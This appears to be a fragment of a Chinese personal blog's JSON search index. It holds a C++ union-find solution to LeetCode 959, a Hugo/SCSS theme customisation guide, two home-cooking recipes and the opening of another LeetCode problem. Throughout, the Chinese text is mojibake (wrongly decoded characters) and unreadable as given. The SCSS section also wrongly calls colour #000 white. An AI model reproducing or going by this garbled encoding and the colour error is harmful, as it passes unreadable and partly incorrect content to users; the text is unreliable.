¼çš„0å·æ°¸è¿œå¤„äºåŒä¸€ä¸ªåŒºåŸŸã€‚åŒç†è€ƒè™‘å·¦è¾¹å’Œä¸Šè¾¹å•å…ƒæ ¼ã€‚ æˆ‘ä»¬è¦éå†æ‰€æœ‰çš„å•å…ƒæ ¼ï¼Œæ•…æ ¼é—´åˆå¹¶åªéœ€è¦é¡¾åŠå·¦å³ä¸¤ä¾§é‚»å±…ä¹‹ä¸€ã€ä¸Šä¸‹ä¸¤ä¾§é‚»å±…ä¹‹ä¸€å³å¯ï¼›ä¾‹å¦‚å¯¹äºæ¯ä¸ªå•å…ƒæ ¼åªè€ƒè™‘ä¸å…¶å³è¾¹å•å…ƒæ ¼å’Œä¸‹è¾¹å•å…ƒæ ¼çš„åˆå¹¶ï¼Œæ¯ä¸ªå•å…ƒæ ¼éƒ½å¦‚æ­¤ï¼Œåˆ™æ‰€æœ‰å•å…ƒæ ¼éƒ½èƒ½æ­£å¸¸å®Œæˆåˆå¹¶ã€‚ æœ€ç»ˆæ“ä½œ\néå†æ¯ä¸ªå•å…ƒæ ¼ï¼ŒæŒ‰ç…§å­—ç¬¦è¿›è¡Œæ ¼å†…åˆå¹¶ï¼›å¦‚æœå³è¾¹å’Œä¸‹è¾¹æœ‰é‚»å±…å°±è¿›è¡Œæ ¼é—´åˆå¹¶ã€‚è¿™æ ·æœ€åå‰©ä¸‹çš„ç‹¬ç«‹å¹¶æŸ¥é›†ä¸ªæ•°å°±æ˜¯æœ€ç»ˆåˆ’åˆ†å¾—åˆ°çš„åŒºåŸŸæ•°ã€‚ è¿™ç§æ–¹å¼çš„å…³é”®åœ¨äºæ ¼é—´åˆå¹¶ï¼Œæ— è®ºæ ¼å†…å­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œæ ¼é—´çš„è”é€šæ€»èƒ½ä½¿å¾—ç¦»æ•£çš„åŒºåŸŸèšåˆ°ä¸€èµ·ã€‚ æ¨¡æ‹Ÿ è€ƒè™‘å¯¹äºç¤ºä¾‹4ï¼š\nè¾“å…¥ï¼š[\u0026quot;/\\\\\u0026quot;,\u0026quot;\\\\/\u0026quot;] è¾“å‡ºï¼š5 ç½‘æ ¼å¦‚ä¸‹ï¼š\nå›¾2. ç½‘æ ¼ æˆ‘ä»¬ä»å·¦ä¸Šåˆ°å³ä¸‹è¿›è¡Œéå†ã€‚\né¦–å…ˆç¬¬ä¸€ä¸ªå•å…ƒæ ¼è¿›è¡Œæ ¼å†…åˆå¹¶ï¼š\nStep1 ç¬¬ä¸€ä¸ªå•å…ƒæ ¼çš„æ ¼é—´åˆå¹¶ï¼Œä»æ­¤å›¾ä¸­å°±ä¸éš¾çœ‹å‡ºæ ¼é—´åˆå¹¶çš„è§„å¾‹ä¸æ ¼å†…å­—ç¬¦æ— å…³ã€‚\nStep2 ç¬¬äºŒä¸ªå•å…ƒæ ¼çš„æ ¼å†…åˆå¹¶ï¼š\nStep3 æ ¼é—´åˆå¹¶ï¼Œæ­¤æ—¶å®ƒå·²ç»æ²¡æœ‰å³é‚»å±…ï¼š\nStep4 ç¬¬ä¸‰ã€ç¬¬å››ä¸ªå•å…ƒæ ¼åˆ†åˆ«æ ¼å†…ã€æ ¼é—´åˆå¹¶ï¼Œæœ€ç»ˆå¾—åˆ°çš„å„ä¸ªç‹¬ç«‹é›†åˆå¦‚ä¸‹ï¼š\nFinal ACä»£ç  å°†ä¸Šé¢çš„æ¨¡æ‹Ÿè½¬åŒ–æˆä»£ç ï¼Œå…¶å…³é”®åœ¨äºå•å…ƒæ ¼å’Œå°ä¸‰è§’å½¢çš„è¡¨ç¤ºã€‚æˆ‘ä»¬å°†äºŒç»´çš„ç½‘æ ¼æ‹‰ç›´ï¼Œåˆ™ä¸€ä¸ªåæ ‡(x, y)çš„å•å…ƒæ ¼ä½äºä¸€ç»´æ•°ç»„ä¸­çš„n * x + yå¤„ï¼›æ¯ä¸ªå•å…ƒæ ¼åˆ†ä¸º4ä¸ªå°ä¸‰è§’å½¢ï¼Œæ•…ä¸€ä¸ªå•å…ƒæ ¼å æ®4ä¸ªæ•°ç»„ç©ºé—´ã€‚\næœ€ç»ˆï¼Œåæ ‡(x, y)çš„å•å…ƒæ ¼ä½äº4 * (n * x + y)åˆ°4 * (n * x + y) + 3çš„ä¸‹æ ‡ä½ç½®ã€‚\nåˆ™æœ€ç»ˆçš„ä¸€ç»´æ•°ç»„å³å¹¶æŸ¥é›†éœ€è¦å¼€è¾Ÿçš„å¤§å°ä¸º4 * n * nã€‚\nclass UnionFind { private: int f[10000]; int cnt; public: UnionFind(int n) { for (int i = 0; i \u0026lt; 4 * n * n; i++) { f[i] = i; } cnt = 4 * n * n; } int getCnt() { return cnt; } int find(int n) { if (f[n] == n) return n; f[n] = find(f[n]); return f[n]; } void Union(int a, int b) { int ra = find(a); int rb = find(b); if (ra == rb) return ; else if (ra \u0026lt; rb) f[rb] = ra; else if (ra \u0026gt; rb) f[ra] = rb; // cout \u0026lt;\u0026lt; \u0026#34;Union \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#34; with \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; cnt--; return ; } }; class Solution { public: int regionsBySlashes(vector\u0026lt;string\u0026gt;\u0026amp; grid) { int n = grid.size(); UnionFind uf(n); for (int x = 0; x \u0026lt; n; x++) { for (int y = 0; y \u0026lt; n; y++) { int base = 4 * (x * n + y); // 0,4,8,... /* æ ¼å†…åˆå¹¶ */ if (grid[x][y] == \u0026#39; \u0026#39;) { uf.Union(base, base + 1); uf.Union(base, base + 2); uf.Union(base, base + 3); } else if (grid[x][y] == \u0026#39;/\u0026#39;) { uf.Union(base, base + 3); uf.Union(base + 1, base + 2); } else if (grid[x][y] == \u0026#39;\\\\\u0026#39;) { uf.Union(base, base + 1); uf.Union(base + 2, base + 3); } /* æ ¼é—´åˆå¹¶ */ if (y \u0026lt; n - 1) // è¿˜æœ‰å³é‚»å±… uf.Union(base + 1, base + 7); // å·±æ–¹1ï¼Œå³é‚»å±…3 if (x \u0026lt; n - 1) // è¿˜æœ‰ä¸‹é‚»å±… uf.Union(base + 2, base + 4 * n); // å·±æ–¹2ï¼Œä¸‹é‚»å±…0 } } return uf.getCnt(); } }; è¡¨ç°è¿˜ä¸é”™ï¼Œå‰ä¼šå„¿è…°ã€‚\nPerformance å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.ç”±æ–œæ åˆ’åˆ†åŒºåŸŸ[EB/OL].2021-01-24\nhttps://leetcode-cn.com/problems/regions-cut-by-slashes/solution/you-xie-gang-hua-fen-qu-yu-by-leetcode-s-ztob/\n","date":"2021-01-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode959.-%E7%94%B1%E6%96%9C%E6%9D%A0%E5%88%92%E5%88%86%E5%8C%BA%E5%9F%9F/","title":"éš¾é¢˜æœ¬ | LeetCode959. ç”±æ–œæ åˆ’åˆ†åŒºåŸŸ"},{"content":"æ€»ä¸èƒ½è®©è¿™ä¸ªåšå®¢è€æ˜¯åœ¨è®°å½•å®¶å¸¸èœå•Šã€‚\næœ¬ç¯‡ä¸»è¦ä»‹ç»hugoåšå®¢çš„è¿›é˜¶ç¾åŒ–æ–¹æ³•ï¼Œæ ¹æ®æœ¬ç¯‡çš„è®²è§£ï¼Œç»“åˆè‡ªå·±çš„ä¸»é¢˜è¿›è¡Œå®è·µï¼Œæœ‰åŠ©äºæ‰“é€ ä¸€ä¸ªçœŸæ­£å±äºè‡ªå·±çš„åšå®¢ã€‚\n1. CSSå’ŒSCSS CSSï¼ˆå±‚å æ ·å¼è¡¨ï¼‰æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç°HTMLæˆ–XMLç­‰æ–‡ä»¶æ ·å¼çš„è®¡ç®—æœºè¯­è¨€ã€‚CSSçš„å­˜åœ¨ä½¿å¾—HTMLé¡µé¢æºç å¯ä»¥æ›´ä¸“æ³¨äºç½‘é¡µæ¶æ„çš„è®¾è®¡ï¼Œè€Œä¸ç”¨åœ¨æºç ä¸­åŠ å…¥è®¸å¤šå…³äºæ ·å¼çš„å­—æ®µï¼Œæå¤§åœ°æé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œç®€æ´æ€§ï¼ŒåŒæ—¶ï¼Œä½¿å¾—ç½‘é¡µæ ·å¼å˜å¾—æ›´å¥½ç»´æŠ¤ã€‚\nSassï¼ˆSyntatically Awesome Style Sheetsï¼‰æ˜¯ä¸€ç§CSSé¢„å¤„ç†å™¨ï¼Œå®ƒå¯ä»¥ç”¨æ¥å®šä¹‰ä¸€å¥—æ–°çš„è¯­æ³•è§„åˆ™å’Œå‡½æ•°ï¼Œä»¥åŠ å¼ºå’Œæå‡CSSã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œä¸€ä¸ªé¡µé¢ä¸­å¯èƒ½éœ€è¦ç”¨åˆ°è®¸å¤šæ¬¡é¢œè‰²#000ï¼Œå³ç™½è‰²ï¼›åœ¨åŸå§‹çš„CSSä»£ç ä¸­è¿™ä¸ª#000éœ€è¦ä¸æ–­åœ°å‡ºç°åœ¨å„ä¸ªä½ç½®ï¼Œå¦‚color: #000ã€background: #000ç­‰ï¼Œè¿™å°±ä¸ºæ ·å¼çš„æ”¹å˜å¸¦æ¥äº†éº»çƒ¦ï¼Œå‡å¦‚æˆ‘ä»¬éœ€è¦æ•´ä½“æ€§åœ°æ”¹å˜é¡µé¢é¢œè‰²ä¸»é¢˜ï¼Œå°±åªèƒ½æ‰¾åˆ°æ‰€æœ‰çš„#000å¹¶å°†å…¶ä¿®æ”¹ï¼Œå®åœ¨ä¸å¤Ÿæ–¹ä¾¿ã€‚è€ŒSasså¼•å…¥äº†å˜é‡ï¼Œå…¶æ¦‚å¿µå’ŒC/C++ç­‰è¯­è¨€ä¸­çš„å˜é‡å¹¶æ— äºŒè‡´ï¼Œæå¤§åœ°ç®€åŒ–äº†æ•°å€¼çš„ç»´æŠ¤ã€‚ç°åœ¨å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å†™æ³•æ¥è®¾ç½®é¡µé¢é¢œè‰²ï¼š\n$WHITE: #000; /* è®¾ç½®å˜é‡ */ .code { background: $WHITE; } .header { color: $WHITE; } ç„¶è€Œï¼Œæœ€åˆçš„Sassçš„è¯­æ³•è§„åˆ™å’ŒCSSæœ‰å¤ªå¤šçš„å‡ºå…¥ï¼Œåæ¥å®˜æ–¹åœ¨2010å¹´æ¨å‡ºäº†ä¸€ä¸ªå…¨æ–°çš„è¯­æ³•ï¼Œå«åšSCSSï¼ˆSassy CSSï¼‰ï¼Œè¯•å›¾å¼¥åˆSasså’ŒCSSä¹‹é—´çš„å·®åˆ«ã€‚ç°åœ¨æˆ‘ä»¬çœ‹åˆ°çš„ä»£ç å¤šæ•°å·²ç»æ˜¯SCSSï¼Œè€Œå…¶çµé­‚å°±æ˜¯å˜é‡ï¼Œå¦‚æ­¤ç†è§£ä¾¿å¥½ã€‚\n2. hugoå’ŒSCSS hugoæ”¯æŒSCSSï¼Œå› æ­¤ä½ æ‰€èƒ½è§åˆ°çš„è¾ƒä¸ºç°ä»£çš„ä¸»é¢˜å¤šæ˜¯ä½¿ç”¨SCSSæ¥å®šä¹‰æ ·å¼ã€‚\nä½ çš„ç½‘ç«™æ ·å¼å­˜æ”¾åœ¨æ ¹ç›®å½•ä¸‹asset/cssæ–‡ä»¶å¤¹ä¸­ï¼Œä¸åŒçš„ä¸»é¢˜å¯èƒ½æœ‰ä¸åŒçš„ç»„ç»‡å½¢å¼ï¼Œå…¶ç»“æ„æ€»ä½“ä¸Šç±»ä¼¼äºä¸€ä¸ªåˆ†å·¥è‰¯å¥½çš„C/Pythonç¨‹åºâ€”â€”å„ä¸ªéƒ¨ä½çš„æ ·å¼åˆ†æˆå„ä¸ªç‹¬ç«‹çš„æ–‡ä»¶æ¥è¿›è¡Œå®šä¹‰ï¼Œæœ€ç»ˆä½¿ç”¨ä¸€ä¸ªä¸»æ–‡ä»¶å°†å„ä¸ªæ¨¡å—include/importè¿›æ¥ï¼Œå®ç°å®Œæ•´çš„é¡µé¢æ ·å¼ã€‚\næˆ‘çš„KeepItä¸»é¢˜æœ‰ä¸€ä¸ªå†…å®¹å¦‚ä¸‹çš„ä¸»æ–‡ä»¶ï¼ŒåŠŸèƒ½æ­£å¦‚æˆ‘æ‰€è¿°ï¼š\nmain.scss æŒ‰ç…§importçš„é¡ºåºï¼ŒHTMLæ–‡æ¡£ä¸­çš„å„ä¸ªæ ‡ç­¾ã€å„ä¸ªClasséƒ½è¢«å…¶ç›¸åº”çš„æ–‡ä»¶èµ‹ä¸Šäº†ç‰¹å®šçš„æ ·å¼ï¼Œæœ€ç»ˆå½¢æˆäº†ä¸€ä¸ªå’Œè°ç¾è§‚çš„ä¸»é¢˜ã€‚\nå¦‚æœä½ äº†è§£CSSï¼Œåº”è¯¥çŸ¥é“CSSä¸­çš„â€œè¦†ç›–â€åŸåˆ™ï¼Œå³å¯¹äºåŒä¸€ä¸ªé€‰æ‹©å™¨ï¼Œå…¶åé¢çš„å±æ€§ä¼šè¦†ç›–å…ˆå‰å‡ºç°çš„å±æ€§ã€‚æ¯”å¦‚å¯¹äºåä¸ºstrçš„ç±»ï¼Œæˆ‘ä»¬çš„CSSæ–‡ä»¶ä¸­å­˜åœ¨ä¸¤ç§å®šä¹‰ï¼š\n/* line 11 */ .str { color: #efefef; } ... /* line 20 */ .str { color: #ffdab9; } é‚£ä¹ˆï¼Œä½äº20è¡Œçš„å®šä¹‰ä¼šè¦†ç›–ä½äº11è¡Œçš„å®šä¹‰ï¼Œä½¿å¾—å…·æœ‰strç±»çš„æ ‡ç­¾å†…å®¹å‘ˆç°#ffdab9è¿™ç§é¢œè‰²ã€‚\nè¿™ç§è¦†ç›–åŸåˆ™å°±æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰hugoæ ·å¼çš„åŸºç¡€ã€‚\n3. ç²¾ç¡®å®šä¹‰æ ·å¼ åŸºäºä¸Šé¢æåˆ°çš„è¦†ç›–åŸåˆ™ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¯¹æŒ‡å®šçš„é€‰æ‹©å™¨è¿›è¡Œå¤šæ¬¡çš„æ ·å¼å®šä¹‰ï¼Œè€Œæœ€ç»ˆæ•ˆæœä»¥æœ€åä¸€æ¬¡å®šä¹‰ä¸ºå‡†ï¼Œç±»ä¼¼äºå˜é‡çš„å¤šæ¬¡èµ‹å€¼ã€‚\nåœ¨æˆ‘æ‰€çŸ¥é“çš„hugoä¸»é¢˜ä¸­ï¼Œasset/cssç›®å½•ä¸­éƒ½æœ‰_custom.scssæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯è®©ç”¨æˆ·è‡ªå®šä¹‰æ ·å¼çš„åœ°æ–¹ã€‚è‡³äºä¸ºä»€ä¹ˆå¯ä»¥ç”¨è¿™ä¸ªæ–‡ä»¶å®ç°æ ·å¼çš„è‡ªå®šä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°çœ‹çœ‹main.scssçš„æœ€åå‡ è¡Œï¼š\nmain.scssçš„æœ€åå‡ è¡Œ å¯ä»¥çœ‹åˆ°ï¼Œæœ€åä¸€è¡Œå¼•å…¥äº†_custom.scssæ–‡ä»¶ï¼Œè¿™ä½¿å¾—å®šä¹‰åœ¨å…¶ä¸­çš„æ ·å¼ä½äºæœ€ç»ˆCSSæ–‡ä»¶çš„æœ«å°¾ï¼Œå…¶ä¸­é‡å¤å®šä¹‰çš„æ ·å¼ä¼šè¢«ä½œä¸ºé¡µé¢çš„æœ€ç»ˆæ•ˆæœã€‚\näºæ˜¯æˆ‘ä»¬çš„é—®é¢˜å°±å˜å¾—å¾ˆç®€å•äº†ï¼šæ‰¾åˆ°ä½ å¸Œæœ›ä¿®æ”¹çš„å…ƒç´ å’Œå®ƒå¯¹åº”çš„é€‰æ‹©å™¨ï¼Œé‡æ–°å®šä¹‰è¿™ä¸ªé€‰æ‹©å™¨å³å¯ã€‚\næ‰€å¹¸ï¼Œç°ä»£æµè§ˆå™¨ä¸ºæˆ‘ä»¬æä¾›çš„å¼€å‘è€…å·¥å…·ä½¿å¾—è¿™ä¸€åˆ‡éƒ½å˜å¾—æ— æ¯”ç®€å•ã€‚ä»¥Edge Betaä¸ºä¾‹ï¼ŒæŒ‰ä¸‹F12å¼¹å‡ºå¼€å‘è€…å·¥å…·ï¼Œä½¿ç”¨å·¦ä¸Šè§’çš„å°ç®­å¤´ä½¿ä½ çš„é¼ æ ‡å˜æˆä¸€ä¸ªæŸ¥çœ‹å™¨ï¼Œç°åœ¨ä½ ç‚¹å‡»é¡µé¢ä¸Šçš„ä»»ä½•å…ƒç´ ï¼Œç«‹å³å¯ä»¥åœ¨å³è¾¹çš„çª—å£çœ‹åˆ°è¿™ä¸ªå…ƒç´ å¯¹åº”çš„æºç ã€‚\nä¾‹å¦‚ï¼Œåœ¨æˆ‘çš„åšå®¢ä¸­æœ‰è¿™æ ·çš„å…ƒç´ å·²ç»è®©æˆ‘ä¸çˆ½å¾ˆä¹…äº†ï¼š\nç²¾ç¡®é€‰å–å…ƒç´  å¯ä»¥çœ‹åˆ°è·Ÿè¿™ä¸ªprojectç›¸åŒçš„aboutme.mdè¿™ä¸ªå•è¯è¢«æ‹†æˆäº†ä¸¤åŠï¼ŒçœŸæ˜¯å²‚æœ‰æ­¤ç†ã€‚\nç°åœ¨æˆ‘ä»¬å¸Œæœ›è¿™æ ·çš„å…ƒç´ ä»¥åéƒ½å•ç‹¬ä½å±…ä¸€è¡Œã€‚å¯ä»¥åœ¨å³è¾¹å¼€å‘è€…å·¥å…·çš„ä¸‹åŠéƒ¨åˆ†çœ‹åˆ°è¿™ä¸ªå…ƒç´ å¯¹åº”çš„CSSï¼Œè¯•ç€æ”¹æ”¹å®ƒçš„æ ·å¼ï¼Œç»“æœçœŸæ˜¯ä»¤äººé«˜å…´ï¼\nåœ¨å¼€å‘è€…å·¥å…·ä¸­ä¿®æ”¹æ ·å¼ æ•ˆæœ åœ¨è¿™é‡Œï¼Œæˆ‘å°†æ­¤ç±»å…ƒç´ çš„backgroundå˜æ·±äº†ä¸€äº›ï¼›ç›´æ¥ç”¨é¼ æ ‡åœ¨æœ€åä¸€è¡Œçš„ä½ç½®å•å‡»ï¼Œå°±å¯ä»¥æ–°åŠ å…¥ä¸€ä¸ªwhite-space: nowrap;çš„æ ·å¼ï¼Œè¿™ä½¿å¾—æ­¤ç±»å…ƒç´ è¢«å¼ºåˆ¶ä¸æ¢è¡Œï¼Œçœ‹ç€çœŸæ˜¯èˆ’æœå¤šäº†ï¼\næ•ˆæœå·²ç»è¿™ä¹ˆå¥½äº†ï¼Œæˆ‘ä»¬ä¸å¦¨å°±å°†è¿™éƒ¨åˆ†ä»£ç ï¼ˆé€‰æ‹©å™¨+æ ·å¼ï¼‰ç›´æ¥æ”¾å…¥_custom.scssï¼Œé‚£ä¹ˆç†è®ºä¸Šæ¥è¯´ï¼Œè¿™éƒ¨åˆ†æ ·å¼å°†è¦†ç›–ä¸»é¢˜åŸæœ‰çš„æ•ˆæœï¼š\nåœ¨SCSSæ–‡ä»¶ä¸­ä¿®æ”¹æ ·å¼ï¼ŒåŒ…æ‹¬æš—é»‘æ¨¡å¼çš„æ ·å¼ ä½¿ç”¨hugo serveråœ¨æœ¬åœ°è¯•è¯•ï¼ŒHmm\u0026hellip;Not badï¼\næœ¬åœ°æ•ˆæœ æœ¬åœ°æ•ˆæœï¼ˆé»‘ï¼‰ ä»¥ä¸Šå°±æ˜¯æœ¬ç¯‡çš„å…¨éƒ¨å†…å®¹ã€‚\nå‚è€ƒæ–‡çŒ®\n[1] æ–°è¥¿å…°ç¨‹åºå‘˜.CSS,Sass,SCSSå…³ç³»[EB/OL].2018-10-10\nhttps://www.cnblogs.com/wphl-27/p/9765647.html\n[2] é€‰æ‹©è¿œæ–¹.csså¼ºåˆ¶ä¸æ¢è¡Œ[EB/OL].2019-03-11\nhttps://blog.csdn.net/qq_40713392/article/details/88411432\n[3] ç™¾åº¦ç™¾ç§‘.CSSï¼ˆå±‚å æ ·å¼è¡¨ï¼‰[EB/OL]\nhttps://baike.baidu.com/item/CSS/5457?fr=aladdin\n","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%973/","title":"åšå®¢æ­å»ºæŒ‡å—â€”â€”3"},{"content":"å®¶å¸¸èœè®°å½•ç¬¬äºŒç¯‡ã€‚\né¸­è‚‰åˆå¹²åˆæŸ´ï¼Œä¸ç“œé£Ÿä¹‹æ— å‘³ï¼Œä¸¤è€…ç»“åˆå€’æ˜¯æœ‰ä¸é”™çš„æ•ˆæœã€‚\né£Ÿæ\nç˜¦é¸­è‚‰åˆ‡æˆç‰‡çŠ¶ï¼ˆä¸åœ¨å›¾ä¸­ï¼‰ï¼Œå¤§è’œå°‘è®¸ï¼Œèƒ¡èåœè‹¥å¹²ï¼Œä¸ç“œä¸€ç›†ã€‚\né£Ÿæ åˆ¶ä½œæµç¨‹\n1. æ²¹ç‚¸é¸­è‚‰\né¦–å…ˆå°†é¸­è‚‰ç‰‡è£¹ä¸Šæœ¨è–¯ç²‰ï¼ˆæˆ–è€…ç‚¸ç²‰ï¼‰ï¼Œä¸å¿…å¤ªå¤šï¼Œä½¿å¾—è‚‰çœ‹èµ·æ¥ä»æ˜¯è‚‰è‰²ï¼Œæ”¾ç½®ç‰‡åˆ»ï¼› é”…åº•æ”¾å…¥é€‚é‡æ²¹ï¼› æ”¾é¸­è‚‰ï¼Œæ­¤æ—¶çš„æ²¹åº”è¯¥èƒ½å¤Ÿæ²¡è¿‡è‚‰ã€‚æ²¹ç‚¸æ•°åˆ†é’Ÿä½¿é¸­è‚‰è¡¨é¢å‘ˆç°æ·±æ£•è‰²ï¼Œç„¶åå°†é¸­è‚‰å–å‡ºã€‚ Step1 Step1.1 2. åŠ èƒ¡èåœ\nå°†åˆšæ‰çš„æ²¹å–å‡ºå°‘è®¸ï¼Œä½¿å¾—å‰©ä½™çš„æ²¹æ²¡è¿‡é”…åº•å³å¯ï¼› æ”¾å…¥è’œç‚’é¦™ï¼Œæ”¾å…¥èƒ¡èåœã€‚ Step2 3. åŠ ä¸ç“œ\nå°†ä¸ç“œå€’å…¥é”…ä¸­ï¼Œçœ‹ä¼¼å¾ˆå¤šï¼Œä¹‹åç‚’åˆ¶å°†ä¼šç¼©æ°´ã€‚ Step3 4. ç„–åˆ¶\nåŠ å…¥é€‚é‡æ°´ä¹‹åç›–ä¸Šé”…ç›–ç„–åˆ¶ï¼Œå…¶é—´é€‚æ—¶å¼€ç›–ç¿»ç‚’ã€‚ æ•´ä¸ªè¿‡ç¨‹å¤§çº¦æ•°åˆ†é’Ÿã€‚ 5. åŠ è°ƒå‘³æ–™ï¼ŒåŠ é¸­è‚‰\nåŠ å…¥ç›ã€ç³–ã€å‘³ç²¾ï¼Œç¿»ç‚’å‡åŒ€ï¼› Step4 åŠ å…¥ä¹‹å‰ç‚¸åˆ¶çš„é¸­è‚‰ã€‚ç¿»ç‚’å‡åŒ€ã€‚ Step5 6. å‡ºé”…\né¸­è‚‰æœ¬æŸ´ï¼Œè£¹ç²‰æ²¹ç‚¸ä½¿å¾—å£æ„Ÿå¾—åˆ°è¾ƒå¥½çš„æ”¹å–„ï¼›ä¸ç“œæ— å‘³ï¼Œæ­£é€‚åˆè§£æ²¹é™¤è…»ã€‚ Final1 Final2 ","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E4%B8%9D%E7%93%9C%E7%82%92%E9%B8%AD%E8%82%89/","title":"é£Ÿè®° | ä¸ç“œç‚’é¸­è‚‰"},{"content":"å¼€å¯äº†æ–°çš„åˆ†ç±»â€”â€”æ—¥å¸¸ç¯‡ã€‚\nä»çŸ¥è¯†åˆ†äº«åˆ°çŸ¥è¯†è®°å½•ï¼Œæœ€ç»ˆæ­¤åšå®¢å¤§æ¦‚è¦å˜æˆæ— æ‰€ä¸åŒ…çš„åœ°æ–¹ç½¢ã€‚\næœ¬æ–‡å¿ å®åœ°è®°å½•ä¸€é“å®¶å¸¸èœçš„åšæ³•ï¼šè·å…°è±†ç‚’è…Šè‚ ï¼ˆåå­—æˆ‘ä¹±èµ·çš„ï¼‰ã€‚è¿™é“èœä¸ºè·å…°è±†é™„ä¸Šäº†è…Šè‚ çš„é¦™æ°”ï¼Œä¸”ä¸å¤±å…¶é’ç¿ æœ¬è‰²ï¼Œæ˜¯æˆ‘ä¸ªäººæ¥å—åº¦è¾ƒé«˜çš„ä¸€ç§è·å…°è±†çš„åšæ³•ã€‚\né£Ÿæ\nè·å…°è±†è‹¥å¹²ï¼Œå¤§è’œå°‘è®¸ï¼Œèƒ¡èåœè‹¥å¹²ï¼ˆç‚¹ç¼€é¢œè‰²ï¼‰ï¼Œç˜¦è‚‰è‹¥å¹²ï¼Œè…Šè‚ åˆ‡ç‰‡ï¼Œç«è…¿è‚ åˆ‡ç‰‡ï¼ˆå¯é€‰ï¼‰ã€‚\né£Ÿæ åˆ¶ä½œæµç¨‹\n1. çƒ­æ²¹ï¼Œæ”¾è’œç‚’é¦™\nè¿™ä¸€æ­¥å¤§æ¦‚æ˜¯å®¶å¸¸èœä¸­çš„èµ·æ‰‹å¼äº†ã€‚ç”±äºè·å…°è±†å¹¶ä¸æ˜¯ç‰¹åˆ«å¸æ²¹ï¼ŒåŠ ä¸Šè…Šè‚ æœ¬èº«åœ¨ç‚’åˆ¶çš„è¿‡ç¨‹ä¸­ä¼šå‡ºæ²¹ï¼Œè¿™ä¸€æ­¥çš„æ²¹é‡æ”¾åˆ°ç›–è¿‡é”…åº•å³å¯ã€‚ç¿»ç‚’æ•°ä¸‹ï¼Œé¦™å‘³é¡¿èµ·ï¼Œä¸é£Ÿè’œè€…å¯å°†è’œæ¡å‡ºã€‚ Step1 2. åŠ èƒ¡èåœ\nä¸ªäººè§‰å¾—èƒ¡èåœåœ¨è¿™é“èœä¸­çš„ä½œç”¨å°±æ˜¯ç‚¹ç¼€ä¸€ç‚¹é¢œè‰²ï¼Œæ”¾æˆ–ä¸æ”¾çš†å¯ã€‚èƒ¡èåœæ—©æ”¾åˆ™å‡ºé”…ä¹‹åå£æ„Ÿè¾ƒä¸ºæŸ”è½¯ï¼Œæ™šæ”¾åˆ™ç”Ÿè„†ï¼Œè‡ªè¡Œæ–Ÿé…Œã€‚ Step2 3. åŠ è…Šè‚ å’Œç˜¦è‚‰\næ²¹é¦™ç«‹å˜ã€‚ Step3 4. åŠ è·å…°è±†å’Œç«è…¿è‚ \nåˆåŠ è·å…°è±†æ—¶ï¼Œå…¶è¡¨é¢æš—æ·¡ï¼›ç¿»ç‚’æ•°ä¸‹å³é’ç¿ æ¬²æ»´ã€‚å¯ä»¥åœ¨æ­¤æ­¥åŠ å…¥ç«è…¿è‚ ï¼Œä»¥æ­¤æ³•åšå‡ºçš„ç«è…¿è‚ åˆ«å…·é£å‘³ã€‚ Step4 Step5 5. ç›–ä¸Šé”…ç›–ç„–åˆ¶ï¼ŒåŠ è°ƒå‘³æ–™\nç›–ä¸Šé”…ç›–ç„–åˆ¶æ•°åˆ†é’Ÿï¼Œå…¶é—´é€‚æ—¶å¼€ç›–ç¿»ç‚’ï¼Œä½¿æ²¹å’Œèœæ··åŒ€ï¼›é€‚é‡åŠ æ°´ä»¥å…å‡ºç°ç„¦å‘³ï¼›æ•°åˆ†é’Ÿåï¼ŒåŠ è°ƒå‘³æ–™ï¼ˆç›ã€å‘³ç²¾ã€ç³–ã€é…±æ²¹ï¼‰ï¼Œç¿»ç‚’å‡åŒ€ï¼Œå¯å†ç„–åˆ¶æ•°åç§’ï¼Œéšåå‡ºé”…ã€‚ æ­¤æ­¥æ— å›¾ã€‚ 6. æˆå“\næ­¤æ³•åšå‡ºçš„è·å…°è±†å…‰æ³½æ˜äº®ï¼Œå…¥å£æœ‰è…Šè‚ é¦™å‘³ï¼Œç»†åš¼åˆ™æœ‰æ¸…é¦™ï¼Œå¹¶ä¸è‚¥è…»ã€‚ Final ","date":"2021-01-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E8%8D%B7%E5%85%B0%E8%B1%86%E7%82%92%E8%85%8A%E8%82%A0/","title":"é£Ÿè®° | è·å…°è±†ç‚’è…Šè‚ "},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/check-if-it-is-a-straight-line/\né¢˜ç›® åœ¨ä¸€ä¸ª XY åæ ‡ç³»ä¸­æœ‰ä¸€äº›ç‚¹ï¼Œæˆ‘ä»¬ç”¨æ•°ç»„ coordinates æ¥åˆ†åˆ«è®°å½•å®ƒä»¬çš„åæ ‡ï¼Œå…¶ä¸­ coordinates[i] = [x, y] è¡¨ç¤ºæ¨ªåæ ‡ä¸º xã€çºµåæ ‡ä¸º y çš„ç‚¹ã€‚\nè¯·ä½ æ¥åˆ¤æ–­ï¼Œè¿™äº›ç‚¹æ˜¯å¦åœ¨è¯¥åæ ‡ç³»ä¸­å±äºåŒä¸€æ¡ç›´çº¿ä¸Šï¼Œæ˜¯åˆ™è¿”å› trueï¼Œå¦åˆ™è¯·è¿”å› falseã€‚\nåˆ†æ 